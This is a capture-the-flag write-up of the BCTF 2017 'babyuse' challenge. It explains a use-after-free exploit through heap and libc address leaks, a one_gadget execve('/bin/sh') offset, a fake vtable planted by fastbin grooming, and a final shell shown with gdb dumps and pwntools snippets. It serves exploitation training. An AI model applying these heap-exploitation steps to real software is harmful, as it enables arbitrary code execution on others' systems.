## UAF - Babyuse - BCTF 2017
**Requirements:**

- An address on heap to store the fake vtable.
- The address of libc to find the what should inside the fake vtable.
- On the heap: fake vtable, an object with the fake vtable address as the name.
- Create the chunck with specific size and order to get control of them.

### I. Leak the address in the heap

1. Let's use pwngdb to print the base address of heap

	```
	Code:
	     buy(10, "AAAABBBB") #Index 0
 	     gdb.attach(p)
	Gdb: 
		 (gdb) heap
		 heapbase : 0x5655a000
	```
	
2. Because the Use-After-Free vulnerability in the `drop()` function, we need to what's the address means when we leak it. Besides, when we use the `rename()` function **it will release the old name chunck and apply a new name chunck**. Plus the attribute of the fastbin, when we drop the object with the new name, the name chunck will return to the fastbin and add to the first of the link list. The result of this is that, when we call the `use()` function the first line of the output is the name of the gun, but this is the new name of the gun, when we drop the gun, the new name chunck will be released and the `FD` pointer will point to old name chunck. So, we can print the address from the heap.

3. To find the address of the chunck, let's put the breakpoint after the `drop()` function and print the heapinfo.

	```
	(gdb) heapinfo
	(0x10)fastbin[0]: 0x5655ea30 --> 0x5655ea20 --> 0x0
	(0x18)fastbin[1]: 0x5655ea08 --> 0x0
	```
 - This is the result after the free, `0x5655ea08` is the address of the object, `0x5655ea20` is the old name chunk and `0x5655ea30` is the new name chunck.

 - After `buy()`, it will apply for a chunck to store the name. 

		```
		(gdb) x/20x 0x5655ea20
		0x5655ea20:	0x00000000	0x00000011	0x41414141	0x42424242 <-- old name
		0x5655ea30:	0x00000000	0x000205d1	0x00000000	0x00000000
		0x5655ea40:	0x00000000	0x00000000	0x00000000	0x00000000
		```

 - Then, the `rename()` will apply a new chunck to store the new name and free the old name chunck back to the fastbin.

		```
		(gdb) x/20x 0x5655ea20
		0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- old name
		0x5655ea30:	0x00000000	0x00000011	0x43434343	0x44444444 <-- new name
		0x5655ea40:	0x00000000	0x000205c1	0x00000000	0x00000000
		```

 - After the `drop()`, the program will also free the new name chunck and this will connect with the old name chunck which is the same size. So, the `FD` pointer in the new name chunck will contains the address of the old name chunck.

		```
		(gdb) x/20x 0x5655ea20
		0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- old name
		0x5655ea30:	0x00000000	0x00000011	0x5655ea20	0x44444444 <-- new name
		0x5655ea40:	0x00000000	0x000205c1	0x00000000	0x00000000
		```

### II. Leak the `execv()` function address in libc.so.6

1. Because the libc.so.6 file is provided by the challenge, we can find the address of the `execv()` function in it and put the address in a fake vtable of the class and call it. So, the first step is to leak the base address of libc. 

2. To leak something of libc, we need to apply the memory from the **main_arena**, which means we need to create two long name objects and free the first chunck then use it.

	```
		#Secend UAF, leak the libc
      	buy(256, "AAAABBBB") #Index 0
      	buy(256, "CCCCDDDD") #Index 1
      	select(0)
      	drop(0)
      	libcleak = u32(use())
	```	
**Q: Why we need to create the second chunck? (unsortbin struct)**

3. Then, we need to do some math to calculate the base address of libc then plus the offset of `execv()` to make our payload. Because the function address in libc is fixed, we can directly print the base address of libc locally and calculate the offset between the address we leak and the base address of libc.

	```
	Code result:
	[+] Starting local process './babyuse': pid 9737
Heap Leak: 0x5655ea20
Libc Leak: 0xf7e3f7b0
	(gdb) libc
	libc : 0xf7c8d000
	```
	We can find the offset is `hex(0xf7e3f7b0 - 0xf7c8d000) = 0x1b27b0`
	
4. At last, we need to find the offset of `execv()` address in libc. Address of `execv()` = Leaked address of libc - offset of base address. We can use the tool `one_gadget` to find the magic gadget in libc.
 
	```
	one_gadget -f libc.so 
	
	0x3ac69	execve("/bin/sh", esp+0x34, environ)
	constraints:
	  esi is the GOT address of libc
	  [esp+0x34] == NULL
	  
	0x5fbc5	execl("/bin/sh", eax)
	constraints:
	  esi is the GOT address of libc
	  eax == NULL
  
	0x5fbc6	execl("/bin/sh", [esp])
	constraints:
	  esi is the GOT address of libc
	  [esp] == NULL
	```

5. We will use the first gadget found by one_gadget and the offset is 0x3ac69. So we can calculate the address in payload: `libcleak - 0x1b27b0 + 0x3ac69`

	```
	[+] Starting local process './babyuse': pid 9737
Heap Leak: 0x5655ea20
Libc Leak: 0xf7e3f7b0
Libc Base: 0xf7c8d000
One_gadget 0xf7cc7c69
[*] Stopped process './babyuse' (pid 9737)
	```
	
### III. Craft the fake vtable and intent object

1. We need to craft the payload with the one_gadget address as a name of a gun. Put the payload on the heap.

	```
	vtable = p32(onegaddr) + p32(onegaddr) + p32(onegaddr) + p32(onegaddr) + p32(onegaddr)
	buy(32, vtable) #Index 0
	buy(32, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") #Index 2
	buy(32, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB") #Index 3
	```
	Then, what's the heap look like?
	
	```	
	0x5655ea10:	0x00000000	0x5655ea48	0x0000000f	0x0000000f <- 1st UAF gun object
	0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <- 1st UAF old name chunck we used
	0x5655ea30:	0x00000000	0x00000011	0x5655ea20	0x44444444 <- 1st UAF new name chunck we used
	0x5655ea40:	0x00000000	0x00000029	0xf7cc7c69	0xf7cc7c69 <- 3rd UAF gun 0 name Start of our payload
	0x5655ea50:	0xf7cc7c69	0xf7cc7c69	0xf7cc7c69	0x00000000
	0x5655ea60:	0x00000000	0x00000000	0x00000000	0x00000019
				vtable		name
	0x5655ea70:	0x56556d30	0x5655ea88	0x0000000f	0x0000000f <- 3rd UAF gun 2 object
	0x5655ea80:	0x00000000	0x00000029	0x41414141	0x41414141 <- 3rd UAF gun 2 name
	0x5655ea90:	0x41414141	0x41414141	0x41414141	0x41414141
	0x5655eaa0:	0x41414141	0x41414141	0x00000000	0x00000019
				vtable		name
	0x5655eab0:	0x56556d30	0x5655eac8	0x0000000f	0x0000000f <- 3rd UAF gun 3 object
	0x5655eac0:	0x00000000	0x00000029	0x42424242	0x42424242 <- 3rd UAF gun 3 name
	0x5655ead0:	0x42424242	0x42424242	0x42424242	0x42424242
	0x5655eae0:	0x42424242	0x42424242	0x00000000	0x00000061
		...
	0x5655eb50:	0x56556d30	0x5655eb68	0x0000000f	0x0000000f <- 2nd UAF gun object
	0x5655eb60:	0x00000000	0x00000109	0x43434343	0x44444444 <- 2nd UAF gun 1 name
	0x5655eb70:	0x00000000	0x00000000	0x00000000	0x00000000
	0x5655eb80:	0x00000000	0x00000000	0x00000000	0x00000000
	0x5655eb90:	0x00000000	0x00000000	0x00000000	0x00000000
	0x5655eba0:	0x00000000	0x00000000	0x00000000	0x00000000
	```

2. Second, we need to free those objects by a specific order. (0->2->3). This order will cause the reverse order in the fastbins link list (3->2->0). So, next time when we apply a short name gun(less than 20->size of gun object), it will use the gun 3's object space of the new object and gun 2's object space for the name.

	```
	payload = p32(heapdest) + p32(heapdest)
	buy(16, payload)
	```
	
	The name of the new object is our payload, which contains the fake vtable address(what we find in the memory `0x5655ea40:	0x00000000	0x00000029	0x00000000	0xf7cc7c69`). So, when we fourth use the UAF to trigger the `use()` function, it will look through the fake vtable and wait for our option(this time is 2 or 3, which is the second function in the vtable, because the first one got replace by `free()`).
	`vtable: vtable = p32(onegaddr) + p32(onegaddr) + p32(onegaddr) + p32(onegaddr) + p32(onegaddr)`
	
	```
	0x5655ea10:	0x00000000	0x5655ea48	0x0000000f	0x0000000f <- 1st UAF gun object
	0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <- 1st UAF old name chunck we used
	0x5655ea30:	0x00000000	0x00000011	0x5655ea20	0x44444444 <- 1st UAF new name chunck we used
	0x5655ea40:	0x00000000	0x00000029	0x00000000	0xf7cc7c69 <- 3rd UAF gun 0 name Start of our payload
	0x5655ea50:	0xf7cc7c69	0xf7cc7c69	0xf7cc7c69	0x00000000
	0x5655ea60:	0x00000000	0x00000000	0x00000000	0x00000019
	0x5655ea70:	0x5655ea4c	0x5655ea4c	0x00000000	0x0000000f <- 4th gun name (3rd UAF gun 2 object)
	0x5655ea80:	0x00000000	0x00000029	0x5655ea40	0x41414141 <- 3rd UAF gun 2 name
	0x5655ea90:	0x41414141	0x41414141	0x41414141	0x41414141
	0x5655eaa0:	0x41414141	0x00000041	0x00000000	0x00000019
				vtable		name
	0x5655eab0:	0x56556d30	0x5655ea70	0x0000000f	0x0000000f <- 4th UAF gun object (3rd UAF gun 3 object)
	0x5655eac0:	0x00000000	0x00000029	0x5655ea80	0x42424242 <- 3rd UAF gun 3 name
	0x5655ead0:	0x42424242	0x42424242	0x42424242	0x42424242
	0x5655eae0:	0x42424242	0x00000042	0x00000000	0x00000061
		...
	0x5655eb50:	0x56556d30	0x5655eb68	0x0000000f	0x0000000f <- 2nd UAF gun object
	0x5655eb60:	0x00000000	0x00000109	0x43434343	0x44444444 <- 2nd UAF gun 1 name
	0x5655eb70:	0x00000000	0x00000000	0x00000000	0x00000000
	0x5655eb80:	0x00000000	0x00000000	0x00000000	0x00000000
	0x5655eb90:	0x00000000	0x00000000	0x00000000	0x00000000
	0x5655eba0:	0x00000000	0x00000000	0x00000000	0x00000000
	```
### IV. Finaly trigger the vulnerability
	```
	./exploit.py 
	[+] Starting local process './babyuse': pid 41084
	Heap Leak: 0x5655ea20
	Libc Leak: 0xf7e3f7b0
	Libc Base: 0xf7c8d000
	One_gadget 0xf7cc7c69
	[*] Switching to interactive mode
	$ 2
	$ id
	uid=1000(kevin) gid=1000(kevin) groups=1000(kevin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
	```